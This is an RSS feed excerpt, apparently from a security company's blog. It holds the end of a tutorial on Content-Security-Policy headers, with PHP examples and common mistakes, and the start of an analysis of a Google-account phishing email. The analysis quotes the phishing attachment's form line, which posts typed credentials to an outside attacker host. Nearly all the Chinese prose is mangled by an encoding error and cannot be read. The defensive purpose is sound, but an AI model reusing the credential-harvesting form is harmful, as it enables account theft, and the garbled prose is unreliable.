    &lt;p&gt;eval() å°è¨±å¤šé–‹ç™¼è€…ä¾†èªªä¸€ç›´æ˜¯å€‹éå¸¸æ–¹ä¾¿çš„å‡½å¼ï¼Œç„¶è€Œè‹¥ç¼ºä¹è³‡å®‰è§€å¿µï¼Œä½¿ç”¨æ­¤å‡½å¼æ™‚å¾ˆå¯èƒ½æœƒå°è‡´æ½›åœ¨çš„ XSS é¢¨éšªã€‚å› æ­¤é™¤éä½ åœ¨ CSP å®£å‘Šæ™‚æœ‰è¨»æ˜ â€˜unsafe-evalâ€™ï¼Œå¦å‰‡ CSP é è¨­ç¦æ­¢ä½¿ç”¨ eval() å‡½å¼ã€‚&lt;/p&gt;

    &lt;p&gt;ä¾‹ï¼šContent-Security-Policy: default-src â€˜selfâ€™; script-src â€˜unsafe-evalâ€™&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;é˜²æ­¢ sniffer&lt;/p&gt;

    &lt;p&gt;ç”±æ–¼ CSP å¯æŒ‡å®šè¼‰å…¥è³‡æºæ™‚å¼·åˆ¶ä½¿ç”¨ https å”å®šï¼Œå› æ­¤å¯é™ä½è¢« sniffing çš„æ©Ÿç‡ã€‚&lt;/p&gt;

    &lt;p&gt;ä¾‹ï¼šContent-Security-Policy: default-src http://devco.re; img-src https:&lt;/p&gt;

    &lt;p&gt;æ•ˆæœï¼šé™å®šåœ–ç‰‡åªèƒ½å¾ https å”å®šè¼‰å…¥ï¼Œä¸é™å®š domainã€‚è€Œé™¤äº†åœ–ç‰‡ä¹‹å¤–çš„è³‡æºå‰‡å¯å¾ä»»æ„ä¾†æºè¼‰å…¥ã€‚&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;csp-demo&quot;&gt;CSP Demo&lt;/h3&gt;

&lt;p&gt;ä¸‹é¢é€™ä¸€æ®µç¨‹å¼ç¢¼ï¼Œä½¿ç”¨ default-src * è®“ç›¸é—œè³‡æºå¯æ­£å¸¸é¡¯ç¤ºï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Security-Policy: default-src *&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CSP Demo Site&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Content Security Policy Demo Site&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;200&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;200&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://devco.re/assets/themes/devcore/images/double-sticker.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/img&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;frameborder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;300&apos;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;200&apos;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;http://www.youtube.com/embed/E-BGf1MwecU&apos;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-1.png&quot; title=&quot;ä½¿ç”¨æœ€å¯¬é¬†çš„ Content-Security-Policy è¦å‰‡&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-1.png&quot; alt=&quot;ä½¿ç”¨æœ€å¯¬é¬†çš„ Content-Security-Policy è¦å‰‡&quot; title=&quot;ä½¿ç”¨æœ€å¯¬é¬†çš„ Content-Security-Policy è¦å‰‡&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹ä¾†æˆ‘å€‘å°‡ php header çš„é‚£ä¸€è¡Œç¨‹å¼ç¢¼ä¿®æ”¹å¦‚ä¸‹ä¸¦ä¸” reload ç€è¦½å™¨é é¢ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Security-Policy: default-src *; img-src https:; frame-src &apos;none&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-2.png&quot; title=&quot;ä½¿ç”¨ Content-Security-Policy é™åˆ¶ img èˆ‡ frame çš„ä¾†æº&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-2.png&quot; alt=&quot;ä½¿ç”¨ Content-Security-Policy é™åˆ¶ img èˆ‡ frame çš„ä¾†æº&quot; title=&quot;ä½¿ç”¨ Content-Security-Policy é™åˆ¶ img èˆ‡ frame çš„ä¾†æº&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä½¿ç”¨ CSP é™åˆ¶ img èˆ‡ frame çš„ä¾†æºç¨®é¡å¾Œï¼Œæˆ‘å€‘å¯ä»¥å¾ä¸Šåœ– Chrome Inspector çš„ç´…å­—è§€å¯Ÿåˆ°ï¼Œç¶²ç«™çš„åœ–ç‰‡èˆ‡ iframe å½±ç‰‡å·²è¢«ç€è¦½å™¨æ“‹æ‰ï¼Œç„¡æ³•è¼‰å…¥ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœæ“”å¿ƒç›´æ¥ä½¿ç”¨ CSP æœƒå½±éŸ¿ç¶²ç«™ç‡Ÿé‹ï¼Œä½†åˆæƒ³å˜—è©¦ CSPï¼Œå¯ä»¥å…ˆä½¿ç”¨ Content-Security-Policy-Report-Onlyï¼Œç¤ºç¯„å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Security-Policy-Report-Only: default-src *; img-src https:; frame-src &apos;none&apos;; report-uri http://devco.re/demo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-report-only.png&quot; title=&quot;Content-Security-Policy-Report-Only&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-report-only.png&quot; alt=&quot;Content-Security-Policy-Report-Only&quot; title=&quot;Content-Security-Policy-Report-Only&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç”±ä¸Šåœ–å¯ä»¥çœ‹åˆ°ï¼Œæ­¤ header ä¸æœƒç›´æ¥é˜»æ“‹ä¸ç¬¦åˆ CSP è¦ç¯„çš„è³‡æºï¼Œä½†æ˜¯æœƒæ ¹æ“šä½¿ç”¨è€…æ‰€é•åçš„è¦å‰‡ç™¼é€ç›¸å°æ‡‰çš„ POST request è‡³æŒ‡å®šçš„ URIï¼Œç™¼é€å…§å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;csp-report&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;blocked-uri&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://devco.re/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;document-uri&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://yoursite.com/csp.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;original-policy&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;default-src *; img-src https:; frame-src &apos;none&apos;; report-uri http://devco.re/demo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;referrer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;status-code&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;violated-directive&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;img-src https:&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ç”±ç™¼é€å…§å®¹å¯çœ‹å‡ºé€™å€‹ request å› ç‚ºé•åäº†ã€Œimg-src https:ã€è¦å‰‡è€Œå°‡ã€Œhttp://devco.re/ã€é€™å€‹ä¾†æºæ“‹æ‰ã€‚ç¶“ç”±æ­¤æ–¹å¼ï¼Œå¯ä¸€é‚Šä¿®æ”¹ç¶²ç«™ä¸€é‚Šè§€å¯Ÿæ˜¯å¦ä»æœ‰ä¸ç¬¦åˆ CSP è¦ç¯„ä¹‹è™•ï¼Œç­‰åˆ°æ‰€æœ‰é•è¦çš„å…§å®¹éƒ½ä¿®æ­£å®Œç•¢å¾Œï¼Œå†å°‡ CSP å¥—ç”¨åˆ°æ­£å¼ä¸Šç·šç’°å¢ƒã€‚&lt;/p&gt;

&lt;p&gt;ç”±æ–¼å®£å‘Šæ–¹å¼éå¸¸å¤šç¨®ï¼Œåœ¨é€™é‚Šå°±ä¸ä¸€ä¸€æ¢åˆ—ï¼Œè‹¥æœ‰èˆˆè¶£å¯å‰å¾€ &lt;a href=&quot;https://content-security-policy.com/&quot;&gt;Content Security Policy Reference &amp;amp; Examples&lt;/a&gt;ã€&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&quot;&gt;Using Content Security Policy - Security | MDN&lt;/a&gt; ç­‰ç¶²é ï¼Œæœ‰æ›´å®Œæ•´çš„ä½¿ç”¨æƒ…å¢ƒèˆ‡ç¯„ä¾‹å¯ä¾›åƒè€ƒã€‚å¦å¤–ä¹Ÿæœ‰ &lt;a href=&quot;http://benvinegar.github.io/csp-talk-2013/&quot;&gt;Slide&lt;/a&gt; (by Ben Vinegar) è·Ÿ &lt;a href=&quot;https://www.youtube.com/watch?v=pocsv39pNXA&quot;&gt;YouTube å½±ç‰‡&lt;/a&gt; (by Adam Barth) å¯åƒè€ƒã€‚&lt;/p&gt;

&lt;h3 id=&quot;csp-å¯¦éš›ä½¿ç”¨æ¡ˆä¾‹&quot;&gt;CSP å¯¦éš›ä½¿ç”¨æ¡ˆä¾‹&lt;/h3&gt;

&lt;p&gt;ç›®å‰æ¡ç”¨ CSP çš„æ¡ˆä¾‹è¼ƒå°‘ï¼Œæ¯”è¼ƒçŸ¥åçš„ä½¿ç”¨æ¡ˆä¾‹æ˜¯ &lt;a href=&quot;https://github.com/&quot;&gt;GitHub&lt;/a&gt;ï¼Œåœ¨ 2013 å¹´ 4 æœˆ &lt;a href=&quot;https://github.com/blog/1477-content-security-policy&quot;&gt;GitHub é‚„å¯«äº†ä¸€ç¯‡å°ˆæ–‡&lt;/a&gt;å…¬å‘Šè¡¨ç¤ºä»–å€‘å·²é–‹å§‹æ¡ç”¨ CSPã€‚å¦å¤–ä¸€å€‹æ¡ˆä¾‹å» å•†å¯èƒ½è¼ƒå»£ç‚ºäººçŸ¥ï¼Œæ˜¯åœ¨ 2013 å¹´ç•¶ç´…çš„å…è²»å„²å­˜ç©ºé–“ &lt;a href=&quot;https://mega.co.nz/&quot;&gt;MEGA&lt;/a&gt;ã€‚å…©å€‹æ¡ˆä¾‹çš„å¯¦éš›å…§å®¹å¯è¦‹æ–¼ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/http-headers-github-and-mega.jpg&quot; title=&quot;GitHub èˆ‡ MEGA ä½¿ç”¨ CSP å¾Œçš„ HTTP response&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/http-headers-github-and-mega.jpg&quot; alt=&quot;GitHub èˆ‡ MEGA ä½¿ç”¨ CSP å¾Œçš„ HTTP response&quot; title=&quot;GitHub èˆ‡ MEGA ä½¿ç”¨ CSP å¾Œçš„ HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦ä¸€é …çŸ¥åä½¿ç”¨æ¡ˆä¾‹æ˜¯ Google æ˜å®š&lt;a href=&quot;https://developer.chrome.com/extensions/contentSecurityPolicy&quot;&gt;é–‹ç™¼ Chrome Extension æ™‚å¿…é ˆä½¿ç”¨ CSP&lt;/a&gt;ï¼Œä»¥è¿½æ±‚æ›´é«˜çš„å®‰å…¨æ€§ã€‚Mozilla ä¹Ÿåœ¨ &lt;a href=&quot;https://wiki.mozilla.org/Security/CSP/Specification&quot;&gt;MozillaWiki é–‹äº†ä¸€é &lt;/a&gt;å­˜æ”¾ç›¸é—œæŠ€è¡“ç´°ç¯€ã€‚è‹¥æ‚¨æƒ³è§€å¯Ÿå…¶ä»–ä½¿ç”¨æ¡ˆä¾‹ï¼Œå¯ä½¿ç”¨ Chrome Inspector æˆ– curl è§€å¯Ÿä»¥ä¸‹å¹¾å€‹ç¶²ç«™ï¼š&lt;a href=&quot;https://lastpass.com/&quot;&gt;LastPass&lt;/a&gt;ï¼Œ&lt;a href=&quot;https://twitter.com/&quot;&gt;Twitter&lt;/a&gt;ï¼Œ&lt;a href=&quot;https://1password.com/&quot;&gt;1Password&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;csp-å¸¸è¦‹èª¤ç”¨æ¡ˆä¾‹&quot;&gt;CSP å¸¸è¦‹èª¤ç”¨æ¡ˆä¾‹&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;directives å¾Œé¢ä¸éœ€åŠ å†’è™Ÿ&lt;/p&gt;

    &lt;p&gt;éŒ¯èª¤ï¼šdefault-src: â€˜selfâ€™&lt;/p&gt;

    &lt;p&gt;æ­£ç¢ºï¼š&lt;strong&gt;default-src â€˜selfâ€™&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;directives ä¹‹é–“ä»¥åˆ†è™Ÿå€éš”&lt;/p&gt;

    &lt;p&gt;éŒ¯èª¤ï¼šdefault-src â€˜selfâ€™, script-src â€˜selfâ€™&lt;/p&gt;

    &lt;p&gt;æ­£ç¢ºï¼š&lt;strong&gt;default-src â€˜selfâ€™; script-src â€˜selfâ€™&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;å¤šå€‹ source ä¹‹é–“åƒ…ä»¥ç©ºç™½å€éš”&lt;/p&gt;

    &lt;p&gt;éŒ¯èª¤ï¼šdefault-src â€˜selfâ€™; img-src â€˜selfâ€™, img1.devco.re, img2.devco.re&lt;/p&gt;

    &lt;p&gt;æ­£ç¢ºï¼š&lt;strong&gt;default-src â€˜selfâ€™; img-src â€˜selfâ€™ img1.devco.re img2.devco.re&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æŸäº› source å¿…é ˆåŠ å†’è™Ÿï¼ˆhttps:ã€data:ï¼‰&lt;/p&gt;

    &lt;p&gt;éŒ¯èª¤ï¼šdefault-src â€˜selfâ€™; img-src â€˜selfâ€™ https data&lt;/p&gt;

    &lt;p&gt;æ­£ç¢ºï¼š&lt;strong&gt;default-src â€˜selfâ€™; img-src â€˜selfâ€™ https: data:&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æŸäº› source å¿…é ˆç”¨å–®å¼•è™Ÿæ‹¬èµ·ä¾†ï¼ˆâ€™noneâ€™ã€â€™selfâ€™ã€â€™unsafe-inlineâ€™ã€â€™unsafe-evalâ€™ï¼‰&lt;/p&gt;

    &lt;p&gt;éŒ¯èª¤ï¼šscript-src self unsafe-inline unsafe-eval&lt;/p&gt;

    &lt;p&gt;æ­£ç¢ºï¼š&lt;strong&gt;script-src â€˜selfâ€™ â€˜unsafe-inlineâ€™ â€˜unsafe-evalâ€™&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;ä½¿ç”¨ CSP å¯ä»¥æœ‰æ•ˆæå‡æ”»æ“Šé›£åº¦ï¼Œè®“è¨±å¤šå¸¸è¦‹çš„ XSS æ”»æ“Šå¤±æ•ˆï¼Œæ˜¯ä¸€å€‹éå¸¸æ¨è–¦é–‹ç™¼è€…ä½¿ç”¨çš„ HTTP headerã€‚ä½†ç”±æ–¼ç›®å‰çš„é–‹ç™¼è€…åœ¨ HTML è£¡é¢å¯« inline script åŠ inline CSS çš„æ¯”ä¾‹éå¸¸é«˜ï¼ŒåŒæ™‚ä¹Ÿæœ‰ä¸€äº›ç¶²è·¯æœå‹™é è¨­éƒ½éœ€è¦ä½¿ç”¨ inline scriptï¼ˆä¾‹å¦‚ Google Analyticsï¼Œç›¸é—œè§£æ³•å¯åƒè€ƒ&lt;a href=&quot;http://stackoverflow.com/questions/3870345/new-google-analytics-code-into-external-file&quot;&gt;é€™è£¡&lt;/a&gt;ï¼‰ï¼Œå› æ­¤è¦äº«å—é€™æ¨£çš„å®‰å…¨ä¹‹å‰ï¼Œå¯èƒ½éœ€è¦å…ˆä»˜å‡ºè¨±å¤šæ™‚é–“èˆ‡å¿ƒåŠ›å°‡ç¶²ç«™å¤§å¹…æ•´ç†ï¼Œå¥—ç”¨ CSP è¦ç¯„å¾Œç¶²é æ‰èƒ½æ­£å¸¸é‹ä½œã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/</link>
                <guid>https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy</guid>
                <pubDate>Tue, 08 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Google å¸³è™Ÿé‡£é­šæ¡ˆä¾‹</title>
                <description>&lt;p&gt;æœ€è¿‘èº«é‚Šçš„æœ‹å‹ä¸æ–·çš„æ”¶åˆ° Gmail ä¸­ Google çš„è­¦å‘Šï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-01.png&quot; alt=&quot;Gmail state-sponsored attacker warning&quot; title=&quot;Gmail state-sponsored attacker warning&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-03.png&quot; alt=&quot;Gmail åœ‹å®¶è³‡åŠ©çš„æ”»æ“Šè€…è­¦å‘Š&quot; title=&quot;Gmail åœ‹å®¶è³‡åŠ©çš„æ”»æ“Šè€…è­¦å‘Š&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é§­å®¢é–“çš„æˆ°çˆ­å·²ç¶“ä¸åªæ˜¯å€‹äººå°å€‹äººï¼Œè€Œå·²ç¶“æ“´å¤§æˆåœ‹å®¶å°åœ‹å®¶ã€‚ä¸€å€‹åœ‹å®¶ç‚ºäº†ç²å–ä»–åœ‹çš„æ©Ÿå¯†æ–‡ä»¶ã€æƒ…å ±ã€å€‹äººè³‡æ–™ç­‰ï¼Œéƒ½æœƒæƒ³ç›¡å„ç¨®è¾¦æ³•å…¥ä¾µå¸³è™Ÿã€å¯„é€æƒ¡æ„éƒµä»¶ã€é‡£é­šç›œå–å¯†ç¢¼ç­‰ã€‚è€Œèº«ç‚ºå—å®³è€…çš„æˆ‘å€‘èƒ½åšä»€éº¼å‘¢ï¼ŸGoogle å®˜æ–¹æå‡ºçš„å»ºè­°æ˜¯ï¼šåŠ å¼·å¯†ç¢¼å®‰å…¨ã€æ³¨æ„ç™»å…¥ IP ä½å€ã€æ›´æ–°è‡ªå·±ä½¿ç”¨çš„è»Ÿé«”ã€&lt;a href=&quot;https://support.google.com/accounts/answer/180744?hl=zh-Hant&quot;&gt;é–‹å•ŸäºŒéšæ®µé©—è­‰&lt;/a&gt;ã€‚ç•¶ç„¶æœ‰è‰¯å¥½çš„è³‡å®‰æ„è­˜æ‰æ˜¯æ›´é‡è¦çš„ã€‚&lt;/p&gt;

&lt;p&gt;æ­£å¥½ä»Šå¤©æ”¶åˆ°ä¸€å€‹ç°¡å–®çš„æ¡ˆä¾‹ï¼Œæä¾›çµ¦å„ä½åƒè€ƒã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;åœ¨ä¿¡ç®±ä¸­èººè‘—ä¸€å°å¾ˆåƒæ˜¯åœ‹å¤–å®¢æˆ¶çš„ä¿¡ä»¶ã€ŒCompany Profile / Order Detailsã€ã€‚å…§å®¹çœ‹èµ·ä¾†ä¹Ÿå¾ˆæ­£å¸¸ï¼Œä¸¦ä¸”é™„ä¸Šäº†å…¬å¸çš„åŸºæœ¬è³‡æ–™ç‚ºé™„åŠ æª”æ¡ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-04.png&quot; alt=&quot;é‡£é­šä¿¡ä»¶&quot; title=&quot;é‡£é­šä¿¡ä»¶&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é»é–‹é™„ä»¶ï¼Œæœƒç™¼ç¾ç•«é¢å…ˆè·³äº† JavaScript è­¦å‘Šè¦–çª—å¾Œï¼Œéš¨å³å°å‘åˆ° Google ç™»å…¥é é¢ã€‚&lt;/p&gt;

&lt;p&gt;æ³¨æ„çœ‹ï¼Œé€™å€‹ç™»å…¥é é¢æ˜¯çœŸçš„å—ï¼Ÿæœ‰æ²’æœ‰ç™¼ç¾ç•«é¢ä¸Šçš„ã€ŒStay signed inã€å‰é¢çš„å‹¾è®Šæˆæ–¹æ¡†äº†ï¼Ÿç€è¦½å™¨ä¸Šçš„ç¶²å€ä¹Ÿæ˜¯åœ¨æœ¬æ©Ÿçš„ä½å€ã€‚æƒ³æƒ³çœ‹ï¼Œæ€éº¼å¯èƒ½é»äº†é™„ä»¶ä¹‹å¾Œï¼Œè·³è½‰åˆ° Google ç™»å…¥ç•«é¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-05.png&quot; alt=&quot;é‡£é­šä¿¡ä»¶é™„ä»¶å‡å†’ Google ç™»å…¥&quot; title=&quot;é‡£é­šä¿¡ä»¶é™„ä»¶å‡å†’ Google ç™»å…¥&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è®“æˆ‘å€‘çœ‹ä¸€ä¸‹åŸå§‹ç¢¼ï¼Œæœƒç™¼ç¾ä»–çš„ form è¢«æ”¹æˆä¸€å€‹å¥‡æ€ªçš„ç¶²å€ï¼Œçœ‹èµ·ä¾†å°±æ˜¯æƒ¡æ„ç¶²ç«™ã€‚å…¶é¤˜ç¶²é çš„éƒ¨ä»½éƒ½æ˜¯å¾ Google çœŸå¯¦çš„ç™»å…¥é é¢æŠ“å–ä¸‹ä¾†ä¿®æ”¹çš„ã€‚å› æ­¤åªè¦ä¸€ä¸æ³¨æ„ï¼Œå°±æœƒä»¥ç‚ºæ˜¯çœŸçš„ Google ç™»å…¥ç•«é¢è€Œè¼¸å…¥å¸³è™Ÿå¯†ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-06.png&quot; alt=&quot;é‡£é­šä¿¡ä»¶åŸå§‹ç¢¼&quot; title=&quot;é‡£é­šä¿¡ä»¶åŸå§‹ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç¯€éŒ„éƒ¨åˆ† code å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;novalidate=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://cantonfair.a78.org/yahoo/post.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gaia_loginform&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
